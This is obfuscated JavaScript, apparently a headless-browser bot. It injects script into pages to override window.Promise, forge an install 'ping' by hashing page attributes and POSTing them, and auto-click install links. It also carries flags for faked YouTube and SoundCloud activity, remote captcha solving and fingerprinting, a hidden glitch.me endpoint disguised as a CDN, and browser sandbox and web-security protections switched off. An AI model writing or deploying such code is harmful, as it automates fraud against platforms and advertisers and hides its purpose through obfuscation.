                J[0xe89 + 0x1ba5 + -0x2a1e] = this['block'], J[K >> 0x1141 + 0x1 * -0x17d7 + 0x698] |= x[0x1bc + -0x1fd0 + 0x1e17 & K], this[U(0x1a, '&fB[')] = J[-0x19f * 0x12 + 0xda4 + 0xf9a], K >= -0x26f * -0x10 + -0x557 * 0x4 + -0x115c && (this['hashed'] || this['hash'](), J[0xabc + -0x181b + -0x7 * -0x1e9] = this['block'], J[-0x2 * 0x346 + -0x493 * -0x4 + 0x58 * -0x22] = J[0xe1 * 0x2a + -0x21e0 + -0x309] = J[-0xe55 * -0x1 + -0x12dd + 0x48a] = J[0x4f6 + 0x5 * -0x14e + 0x193] = J[0xc1 * 0x1 + -0x8f5 * -0x2 + -0x12a7] = J[0x18b * -0x14 + 0x1d3a + 0x8d * 0x3] = J[-0xea3 + 0x1a7a + -0xbd1] = J[-0x1f4c + -0x17f4 + 0x9f * 0x59] = J[-0x33 * 0x8e + -0x2e9 + 0x29 * 0xc3] = J[-0x1f3 * -0x3 + 0x14b1 + -0x1a81] = J[-0x3cd + -0x1ff9 + -0x47a * -0x8] = J[-0x1 * 0x1f67 + -0x18 * -0x10c + 0x652] = J[-0x504 * -0x3 + 0x2 * 0xbc3 + 0x2 * -0x1343] = J[0x1824 + 0x1570 + -0x2d87] = J[-0x1 * -0x57a + 0x2642 + 0x2bae * -0x1] = J[0x260b + 0x19f1 + 0xcc9 * -0x5] = 0x2 * -0x161 + -0x1 * 0x9eb + 0x1 * 0xcad), J[0x1854 + -0x2d3 * -0x7 + -0x19 * 0x1c3] = this['hBytes'] << 0x37f * -0x8 + 0xd64 + -0x53 * -0x2d | this['bytes'] >>> 0x7 * 0x41c + 0xd3 * 0x3 + 0x30 * -0xa6, J[0x9 * 0x3df + 0x1822 + -0x3aea * 0x1] = this['bytes'] << -0x1b82 + -0x26f5 + 0x427a, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x23b2 + 0x59 * -0x5e + 0x6c * -0x7; J < 0x1 * 0xbe1 + -0xf2 * 0x3 + -0x8bb; ++J)
                K = Q[J - (-0x1 * 0x22db + 0x3 * -0x3a6 + 0x2dd0)] ^ Q[J - (0x20 * 0xa2 + -0x78d + 0x3 * -0x439)] ^ Q[J - (0x2096 + 0x1 * 0x7bf + -0x1 * 0x2847)] ^ Q[J - (0xd * -0x71 + 0x1f4 * -0x2 + -0x163 * -0x7)], Q[J] = K << -0x2269 + -0x2 * -0x107e + 0x6 * 0x3d | K >>> 0x5dd + -0x69c + 0xde;
              for (J = -0x1 * 0x1ca6 + 0x6b9 + 0x15ed; J < -0x219f + -0x2201 + 0x43b4; J += -0x1 * 0x1652 + -0x823 + -0x1e7a * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x14c1 + 0x280 * -0xc + 0x944 | L >>> -0x4d0 + 0x8c8 + -0x1 * 0x3dd) + (M & N | ~M & O) + P + (0xf9 * -0x2c9d0b + 0x3f8b5a * 0x16 + 0x80713f90) + Q[J] << -0x2191 + 0x5f + -0x1099 * -0x2) << -0x24b + 0x1 * -0x14cb + 0xa9 * 0x23 | P >>> -0xe6e + -0x126b + 0x20f4) + (L & (M = M << 0x1c8b + -0xa3d + -0x1230 | M >>> 0x13c8 + 0x6 * -0x3b3 + -0x9b * -0x4) | ~L & N) + O + (0x36724a8 * -0x5 + -0x1f1 * -0x451081 + -0x6a3b664 * 0x4) + Q[J + (-0x1728 + -0xfaf + 0x26d8)] << 0x1acc + -0x1 * 0x138f + -0x1 * 0x73d) << -0x2264 + 0x234c + -0xe3 | O >>> -0x77b + 0xaa4 + -0x30e) + (P & (L = L << -0x725 + 0x7 * 0x45a + 0x1733 * -0x1 | L >>> 0x1a44 + -0xb8c + -0xeb6) | ~P & M) + N + (0x1 * 0x3fc8c98f + 0xb * 0x690c4df + -0x2d7ec58b) + Q[J + (0x14c5 + -0x1b86 + 0x1 * 0x6c3)] << 0x1535 + 0x14ba + -0x5f * 0x71) << 0x11 * 0x247 + -0x11 * -0xfd + -0x377f | N >>> -0x938 * 0x4 + 0x1066 * -0x2 + 0x1 * 0x45c7) + (O & (P = P << -0x1 * 0xb45 + -0xfce + -0x1b31 * -0x1 | P >>> -0xf7e * -0x1 + -0x17da + -0x12 * -0x77) | ~O & L) + M + (-0x1c00fd * 0x541 + -0x1aa8 * -0x294b5 + 0xa * 0x10e25e9b) + Q[J + (0x3 * 0x31d + -0x2575 + 0x1c21)] << -0x212 * 0x2 + 0xc1 * 0x1a + 0x1 * -0xf76) << -0x18f7 + 0x49b * 0x6 + -0x71 * 0x6 | M >>> 0x16e + 0x2677 + -0x27ca) + (N & (O = O << -0x3 * -0x523 + -0x1732 + 0x7e7 | O >>> 0x2 * -0x86 + 0x2 * -0xb8d + 0x8 * 0x305) | ~N & P) + L + (-0x3d8f6eed + 0x6eab27e2 + 0x2b4 * 0xf50ed) + Q[J + (0x239a + -0x1bf7 + -0x79f * 0x1)] << 0x1d2d + 0x1397 + -0x30c4, N = N << -0xb50 + 0x21c1 * 0x1 + 0x1 * -0x1653 | N >>> -0x1411 + -0xb65 * -0x3 + -0xe1c * 0x1;
              for (; J < -0x20de * -0x1 + 0xbc * -0x2b + -0x122; J += 0xe * 0x292 + -0x874 + -0x1b83)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xdb6 + -0x268d + -0x1de * -0x1c | L >>> -0xd3d + 0x1101 + -0x3a9) + (M ^ N ^ O) + P + (-0x35d7fcb2 + -0x2534e5f8 + 0xc9e6ce4b * 0x1) + Q[J] << -0x1968 + 0x1 * 0x259f + -0xc37) << -0x112 + -0xbf6 + 0xd0d | P >>> -0x16fd + -0x30 * -0x11 + 0x13e8) + (L ^ (M = M << 0x23a3 + -0x21ff + 0x186 * -0x1 | M >>> 0x1 * 0x244c + 0x1 * 0x2004 + 0x4e1 * -0xe) ^ N) + O + (-0xeb6a * -0x74ba + 0x94debb8a + 0x3073f64f * -0x3) + Q[J + (-0x43 * 0x1 + 0x1f3e + -0x1efa)] << 0x5 * -0x62b + -0x1 * 0x25a2 + 0x4479) << 0x20 * -0x119 + -0x5 * 0x16 + 0x2393 | O >>> -0xa38 + -0x316 + 0xd69) + (P ^ (L = L << -0x95 * 0x4 + -0x1720 + -0x443 * -0x6 | L >>> 0x1de1 + -0x26a3 + 0x16 * 0x66) ^ M) + N + (-0xd09cbd26 + 0x45379271 + -0x16 * -0xb5ff561) + Q[J + (-0x120b + -0xb8 * 0xf + 0x1cd5)] << -0x18c5 + -0x4 * -0x9a3 + 0x1 * -0xdc7) << 0x23b3 + 0x2063 + 0x19 * -0x2b9 | N >>> -0x22f9 + -0x25b5 + 0x48c9) + (O ^ (P = P << 0x187 + 0x1cb4 + -0x1e1d | P >>> -0x5 * -0x271 + 0xd7e + -0x19b1) ^ L) + M + (0x1 * 0x3c7b6f19 + -0x734594ca + -0xa5a41152 * -0x1) + Q[J + (0x15fe + -0x7f7 * -0x1 + -0x1df2)] << -0x8 * 0x139 + -0x45b * 0x4 + -0xd9a * -0x2) << -0xab * 0x2d + -0x1 * 0x1589 + 0x339d | M >>> 0xe * 0x10f + 0xb * 0xf9 + -0x196a) + (N ^ (O = O << -0x377 * 0x5 + 0x66d + 0xb04 | O >>> 0x24ea + -0x5 * -0x139 + -0x2b05) ^ P) + L + (-0xc4441ecb + 0x49e6b3d4 + -0x388b4 * -0x41fe) + Q[J + (0x9db + 0x3b * 0x11 + -0x6e1 * 0x2)] << -0x86 * -0x4a + -0x1af8 + -0xbc4, N = N << -0x7 * 0x65 + -0x23a6 + -0x581 * -0x7 | N >>> 0xd60 + 0x18d2 + 0x2f0 * -0xd;
              for (; J < 0x1614 + 0x55 * -0x52 + 0x562; J += -0x9 * 0x3c9 + 0x642 + 0x1bd4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x337 * -0x5 + 0xcc8 + -0x1cd6 * 0x1 | L >>> -0x20d9 + 0x1 * -0x1a79 + 0x3b6d) + (M & N | M & O | N & O) + P - (-0xca26 * -0x64c4 + 0x1 * 0xac30fd40 + -0x8ade5734) + Q[J] << 0xf3 * -0x1d + 0x2032 + -0x4ab) << -0x10e1 * -0x2 + 0xd8e + -0x2f4b | P >>> -0x1de8 + -0x1 * 0x5c4 + 0x23c7) + (L & (M = M << -0x9 * 0x147 + 0x102d * -0x2 + 0x2bf7 | M >>> 0x173 * -0xb + 0x2bd * -0xb + -0x2e12 * -0x1) | L & N | M & N) + O - (-0x67 * 0x110b885 + 0xa307a * 0x1435 + -0x11d654b * -0xf) + Q[J + (-0x160 + 0xb33 + 0x9d2 * -0x1)] << 0x27f * -0x8 + -0x86d + -0x1 * -0x1c65) << 0xb84 + 0x7 * -0x2e7 + 0x8d2 | O >>> -0xd22 + -0x545 + -0x1282 * -0x1) + (P & (L = L << -0x1790 + 0x2703 + -0xf55 | L >>> -0x1 * 0xfd9 + 0x1736 + -0x75b) | P & M | L & M) + N - (-0xd0465460 + -0x1c112f * 0x135 + 0xf0413 * 0x17a5) + Q[J + (0x892 + 0x253 + -0xae3)] << -0x1dc7 + 0x1 * 0x4eb + 0x637 * 0x4) << 0x163 * -0x8 + 0x1 * 0x25 + 0xaf8 | N >>> -0x8 * -0x160 + -0x1 * 0x1687 + 0xba2 * 0x1) + (O & (P = P << -0x9 * 0x107 + 0x968 * 0x3 + 0x1 * -0x12db | P >>> -0x728 * -0x3 + 0x1cdb + -0xb * 0x493) | O & L | P & L) + M - (-0x7 * 0xbd9b017 + -0x936e569c + 0x157466a61) + Q[J + (0x2 * 0x945 + 0x6a3 * -0x5 + 0x8 * 0x1d5)] << -0xbaa * -0x3 + 0x2ef * -0x9 + 0x897 * -0x1) << -0x1 * 0x2154 + 0x993 + 0x17c6 * 0x1 | M >>> -0xc6d * -0x1 + -0xba8 + -0xaa) + (N & (O = O << 0x14c8 + -0x145b + -0x4f | O >>> 0x1b70 + -0x72c + 0x1442 * -0x1) | N & P | O & P) + L - (0x85 * -0x1b05797 + 0x1c702749 + 0x135119d4e) + Q[J + (-0x404 + -0x1fb3 + -0x3 * -0xbe9)] << 0x7 * 0x2e3 + 0x1 * 0x1349 + -0x277e, N = N << 0xffc + -0x1 * -0x685 + -0x1663 | N >>> 0x2109 + -0xd81 + -0x1386;
              for (; J < 0x1e6c + -0x151 * -0x12 + -0x35ce * 0x1; J += 0xeae + -0x135a + 0x4b1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x427 + 0x204f + 0x2471 * -0x1 | L >>> 0xcd7 * -0x3 + -0x21c5 + -0x4865 * -0x1) + (M ^ N ^ O) + P - (-0x51a28ea3 * 0x1 + 0xa9 * 0x4edc0c + 0x533088e1) + Q[J] << 0xfcd + 0xb0e + -0x1adb) << 0x2 * 0x371 + 0x907 + -0xc * 0x153 | P >>> -0x90b + -0xd5d + 0x1683) + (L ^ (M = M << 0x1e6f + 0x1761 + 0x11e6 * -0x3 | M >>> 0x1 * 0x3b7 + 0x31a + -0x6cf) ^ N) + O - (0x466825b3 * 0x1 + 0x1 * -0xe87b602 + -0x2433187) + Q[J + (-0x1 * -0x1aff + 0x1 * -0x36d + -0x1791)] << 0x9fe + 0x1aca + -0x24c8) << -0x1292 * 0x1 + 0xb75 * -0x2 + 0x2981 | O >>> 0x1dc1 * -0x1 + -0x2 * 0x108a + 0x4c * 0xd4) + (P ^ (L = L << 0x9ba + -0x1 * -0x168d + 0x1 * -0x2029 | L >>> -0xa3a + -0x53 * 0x59 + 0x2717 * 0x1) ^ M) + N - (-0x5f4eea73 + 0x4fff05d7 + 0x44ed22c6) + Q[J + (0x121b + -0x1 * 0x19d3 + 0x7ba)] << -0xdc8 + 0x101c + 0x4 * -0x95) << 0x1142 + 0x1738 + -0x2875 | N >>> 0x1 * 0x397 + 0x1f73 + 0xba5 * -0x3) + (O ^ (P = P << -0x1 * -0x146b + 0x4bc * -0x8 + 0x1193 | P >>> -0x5b * 0x41 + -0x1606 + 0x1 * 0x2d23) ^ L) + M - (-0xb * 0x6ea3f88 + 0x1 * -0x12b9908b + 0x9467898d) + Q[J + (0x17a + 0x2010 + 0x1 * -0x2187)] << -0xd10 + 0x3 * 0xa75 + -0x124f) << 0x23b7 + -0x24e4 + 0x132 | M >>> 0x57 * 0x27 + 0x14cb * -0x1 + -0x1 * -0x7a5) + (N ^ (O = O << -0x993 + 0x190b + -0xf5a | O >>> 0x5 * -0x371 + 0xc75 * 0x2 + -0x1 * 0x7b3) ^ P) + L - (-0x14cbb * 0xe59 + -0x10827db2 + 0x58c5a2df) + Q[J + (0x158a + -0x1dd8 + 0x429 * 0x2)] << -0x1981 * 0x1 + 0x7a0 + -0x11e1 * -0x1, N = N << 0x1 * -0x191c + -0x217d + -0x1 * -0x3ab7 | N >>> 0xee3 + 0x427 * -0x5 + 0x5e2;
              this['h0'] = this['h0'] + L << -0x2032 + -0x112a * 0x2 + -0x1a * -0x28f, this['h1'] = this['h1'] + M << 0x7f3 + -0x1f79 + 0x1 * 0x1786, this['h2'] = this['h2'] + N << 0xac0 + 0x3e5 * -0xa + -0xe19 * -0x2, this['h3'] = this['h3'] + O << -0x70 + -0x4 * 0x830 + -0x8 * -0x426, this['h4'] = this['h4'] + P << 0x1fbe + -0xe00 + 0x1 * -0x11be;
            }
            ['hex']() {
              const V = c;
              this[V(0x23)]();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x1333 + 0xf67 * 0x2 + -0x9 * 0x147 & 0x14f5 + -0x4d6 * 0x5 + 0x348] + w[J >> -0x13 * 0x1a + 0xe47 + -0xc41 & 0x4 * 0x4bd + -0x218c + 0xea7] + w[J >> -0x246f * 0x1 + -0x2361 + 0x47e4 & -0x12bc + 0x169a + -0x3cf] + w[J >> 0x1 * 0xcf + 0x5e7 + -0x6a6 & 0x2bd * 0xa + -0x206b + 0x518] + w[J >> 0x23aa * 0x1 + 0x1 * -0x1091 + -0x130d * 0x1 & 0x198 + -0x5 * -0x187 + -0x92c] + w[J >> -0x190d * -0x1 + 0x1ac3 + -0x33c8 & 0x1ddb * -0x1 + -0x5d * -0x29 + -0x301 * -0x5] + w[J >> 0x37 * 0x30 + 0x1 * -0x1b04 + 0x6b * 0x28 & 0x10 * -0x1c + -0x934 * -0x4 + -0x2301] + w[0x1 * -0x26f6 + -0x3f2 + 0x2af7 & J] + w[K >> 0x13f3 + 0x5 * -0x3d7 + -0xa4 & 0x10d * -0x1 + 0x1 * 0x38f + -0x1 * 0x273] + w[K >> -0x1fe3 + -0x1b0b + 0x3b06 * 0x1 & 0x282 + 0x255c + -0x27cf] + w[K >> -0x4c * 0x19 + -0x729 * -0x1 + -0x1 * -0x57 & 0x1169 + -0x710 + -0xa4a] + w[K >> -0x2bd * 0x8 + 0x14 * 0x104 + 0x1a8 & 0x1 * 0x23f3 + 0x3 * 0x9c7 + -0x4139] + w[K >> 0x2af * 0xc + -0x8b * -0x1f + -0x30fd & 0x5 * -0x6af + -0x27a * 0x3 + -0x11 * -0x268] + w[K >> -0xf * -0xf9 + 0x1 * 0xdc7 + -0x1c56 & -0xdc7 * 0x1 + 0x21f7 + 0x1421 * -0x1] + w[K >> 0x64e * 0x4 + 0x2b * 0x73 + -0x2c85 & 0x5bf * -0x4 + 0xcb5 * 0x3 + -0xf14] + w[-0x2 * 0x47f + -0xef9 + 0x1806 & K] + w[L >> -0x1 * 0x9bb + 0xaf1 + -0x11a & 0x23de + 0x882 + -0x1 * 0x2c51] + w[L >> 0x2 * -0xabd + 0x1c97 * 0x1 + -0x705 & 0x211 * -0x2 + -0x1db4 + -0x21e5 * -0x1] + w[L >> -0x70e + -0x3dd * 0x7 + 0x222d & 0x1aa4 * -0x1 + 0xed * 0x1c + -0xc7 * -0x1] + w[L >> -0x123d + 0x2ef + 0xf5e & -0x1361 + 0x248c + -0x2da * 0x6] + w[L >> 0x8d7 + 0x772 + 0x1 * -0x103d & -0x1368 * -0x1 + 0x2 * 0x577 + 0x1e47 * -0x1] + w[L >> -0x242d + 0x8c8 * 0x1 + 0x1b6d & 0x1d58 + -0xd * -0xb + -0x28 * 0xbf] + w[L >> 0x2546 * 0x1 + 0x1dfd * -0x1 + 0x745 * -0x1 & 0x10ca + 0x15 * -0x1c1 + 0x141a] + w[-0x3 * -0xc7 + 0x766 + -0x9ac & L] + w[M >> -0x21c3 + -0x2680 + -0x61 * -0xbf & -0x26e2 + -0xf6f + -0xa * -0x570] + w[M >> 0x5 * -0x293 + 0x1 * 0x9ef + 0x308 & -0xf * -0x24b + -0x12d * -0x15 + -0x3b07] + w[M >> -0x6f + -0x148b + 0x16 * 0xf5 & -0x2 * 0x887 + 0xb + 0x1 * 0x1112] + w[M >> 0xf92 * 0x1 + 0x11e1 + -0x2163 & 0xbb3 + 0x243f + -0x2fe3] + w[M >> -0xf0e + 0x1 * -0x14b + 0x1065 & 0x2028 + 0x26c6 + -0x46df] + w[M >> 0x5 * -0x536 + 0x9a9 + 0x106d & 0x468 * -0x8 + -0x62 * -0x13 + 0x1 * 0x1c09] + w[M >> -0x846 + 0x1003 * 0x1 + -0x7b9 & 0xdf + 0x4 * -0x8ee + 0x22e8] + w[-0x1c62 + -0x3c * -0x9f + 0xfb * -0x9 & M] + w[N >> -0x1e43 + 0x1 * -0x26f2 + 0xddd * 0x5 & -0x607 + -0x12ae + 0x18c4] + w[N >> -0x166d * 0x1 + 0x25ff + -0x7bd * 0x2 & 0x89b * -0x1 + 0x53f + -0x23 * -0x19] + w[N >> 0x22 * -0xe6 + -0x2421 + -0x42c1 * -0x1 & 0x24 * -0x77 + -0xd5b + 0x1c6 * 0x11] + w[N >> -0x2 * 0x2c5 + 0xe50 * -0x2 + 0x1 * 0x223a & -0x1 * -0x1dfe + 0x182c + 0x201 * -0x1b] + w[N >> -0x4a2 * 0x2 + -0x1 * -0x704 + 0x24c & 0x60b * 0x2 + -0x217b + 0xaba * 0x2] + w[N >> 0x254f + 0x997 + -0x2ede * 0x1 & -0xdf0 * -0x2 + -0x100 * 0x12 + -0x9d1] + w[N >> -0x2269 * -0x1 + 0x1617 + -0x387c & -0x6 * -0x4c1 + -0x1 * -0xc51 + -0x12 * 0x244] + w[0x18d8 + 0x31b * 0x5 + -0x2850 & N];
            }
            ['digest']() {
              const W = b;
              this[W(0x1b, '6U$q')]();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x6c4 + -0x73b * 0x3 + 0xf05 & -0x1b91 + -0x2 * -0x3c5 + -0x381 * -0x6,
                J >> -0x1754 + 0x167d * -0x1 + 0x2de1 & -0x2092 * 0x1 + 0x2 * -0x97 + 0x251 * 0xf,
                J >> -0x21c9 + -0x1 * -0xddf + 0x13f2 & -0x2277 * -0x1 + 0x3 * -0x9d9 + -0x3ed,
                0x1 * 0x40f + 0x21bd + -0x24cd & J,
                K >> -0x1170 + 0x2 * 0xed1 + 0x60d * -0x2 & -0x10 * 0xa6 + 0x29 * -0xad + 0x2714,
                K >> -0x5 * 0x71 + -0x50 + 0x295 * 0x1 & 0x9d * -0x21 + 0x1e75 + -0x939,
                K >> -0x233f + 0xb6b * -0x2 + 0x3a1d & -0x89b * -0x2 + -0x5d4 + -0xa63,
                -0xbc * 0x1f + -0x1e44 * -0x1 + -0x681 & K,
                L >> -0x12 * 0x53 + 0x60f * 0x2 + 0xb0 * -0x9 & 0x1cb5 + 0x3b9 * -0xa + 0x984,
                L >> -0x2670 + -0x5c2 + 0x37 * 0xce & 0x259 * 0x6 + -0xa04 + 0x1 * -0x313,
                L >> 0x1 * 0x2137 + -0x1a22 + -0x5f * 0x13 & -0x1f04 + -0x1 * 0x87f + 0x40d * 0xa,
                0x205a * 0x1 + -0x283 * -0x5 + 0x1 * -0x2bea & L,
                M >> -0x149f + 0x25c0 + -0x1109 & -0x178d + 0x1cda + -0x1 * 0x44e,
                M >> -0x1aa + 0xa35 + 0x87b * -0x1 & -0x1 * -0xef9 + 0xd4 + 0x2f6 * -0x5,
                M >> -0x2359 * -0x1 + 0x4c0 + -0xd * 0x315 & -0xc87 + 0x5 * -0x504 + -0x12 * -0x225,
                -0x94c + -0x1603 + 0x204e & M,
                N >> 0x2 * -0x574 + -0x468 + 0xf68 & 0x1816 + -0x1 * -0x3ef + -0x2 * 0xd83,
                N >> 0x1 * -0xafd + 0x35a + -0x49 * -0x1b & -0x586 + 0x3 * -0x51 + 0x778,
                N >> -0x3b * -0x8b + 0x283 * 0xd + -0x40a8 & -0x233 * -0x7 + 0x50 * -0x17 + -0x736,
                -0x9 * 0x149 + 0x180e + 0xb7e * -0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1 * -0x141 + 0x2153 + -0x5c * 0x60), (K = new DataView(J))['setUint32'](-0x1c97 + -0x18b7 + 0x354e, this['h0']), K['setUint32'](0x8f * -0x1a + 0x2c5 * -0x1 + -0x15 * -0xd3, this['h1']), K['setUint32'](0x1 * 0x1557 + 0x1ab4 + 0x1001 * -0x3, this['h2']), K['setUint32'](-0x1 * -0x26b4 + -0x69a + -0x200e, this['h3']), K['setUint32'](0x436 + 0x1d * -0x11d + 0x1c23, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x527 * -0x2 + -0x2345 + 0x2d93];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x2395 + 0x92b + 0x1a6a;
            J[0x4b7 + 0x1b25 * 0x1 + 0xfee * -0x2]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1ae2 * 0x1 + -0xd69 + 0x1 * -0xd79] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x61c + 0x25 * 0x109 + 0x67 * -0x50), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x1 * -0x11fb + 0x1 * 0x1b01 + -0x1 * 0x905;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x5b2 + -0x9 * -0xc2 + -0xca * -0x6), Promise['resolve'](-0x1 * 0x1ebb + 0x1a70 + 0x44c);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1e76 + 0x383 + -0xd * 0x29d; j < -0x5d1 + -0x2138 * -0x1 + -0xdb3 * 0x2; j++)
    i();
}
const NETWORK_PATIENCE = -0x79b + 0x286a + 0x7 * -0x39 + (-0xeb9 * -0x1 + 0x1be7 * -0x1 + 0x18e6) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x7eb + -0xc * 0x76 + -0xd76 * -0x1) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + X(0x8, 'jMi*') + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x2 * 0x125 + 0x14a6 + -0x16f0; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const Y = c;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j[Y(0xa)](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xc35 + -0x1292 + 0x65d);
    let h = e[f];
    if (b['ZXPxmw'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x1f4 * 0x2 + 0x25a3 + -0x298b, s, t, u = -0x3b * 0x1d + -0x125e + 0x190d; t = n['charAt'](u++); ~t && (s = r % (-0x1674 + 0xbc6 + 0xab2) ? s * (-0xe3f + -0x73b + -0x1 * -0x15ba) + t : t, r++ % (0x854 + 0xa * 0x1 + -0x85a)) ? p += String['fromCharCode'](0xb * -0x175 + -0x1 * 0xc4c + 0x1d52 & s >> (-(-0x1 * 0xef + -0x13ca + 0x14bb) * r & -0x157f * 0x1 + -0x1e1c + 0x33a1)) : -0x1 * -0x461 + -0x13 * 0x1ae + 0x1b89 * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = 0x950 + 0x2e2 + -0xc32, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x146c + -0x87 * -0x2b + -0x231))['slice'](-(0x2 * -0xd9f + -0x130a + 0x2e4a));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x11f * -0x1 + 0x1775 * -0x1 + 0x1656,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x1ef7 + -0x750 + -0x5 * 0x4bb; u < -0x5a9 + -0x522 * -0x6 + -0x1823; u++) {
          p[u] = u;
        }
        for (u = -0x122 * 0x13 + 0x1 * -0xe21 + -0x1 * -0x23a7; u < 0x48a + -0x2427 + -0x209d * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x206c + -0x1 * -0x208e + -0x3ffa), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x7 * -0x412 + 0x16c * -0x19 + -0x102 * -0x7, q = -0x17fb + -0xdf9 + -0x97d * -0x4;
        for (let v = 0x1d * 0xec + 0x81 * 0xe + -0x21ca; v < n['length']; v++) {
          u = (u + (0x16 * -0x3 + -0x6d7 * 0x2 + -0xdf1 * -0x1)) % (0x1 * -0x21a6 + 0x2665 + -0x89 * 0x7), q = (q + p[u]) % (0x4 * 0x968 + 0xe39 + 0x3 * -0x10f3), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * -0x112 + -0x1d37 * 0x1 + 0x1d25)]);
        }
        return t;
      };
      b['lDCRly'] = m, c = arguments, b['ZXPxmw'] = !![];
    }
    const j = e[-0x2301 + 0xc83 * 0x1 + 0x167e],
      k = f + j,
      l = c[k];
    return !l ? (b['lfFvgz'] === undefined && (b['lfFvgz'] = !![]), h = b['lDCRly'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
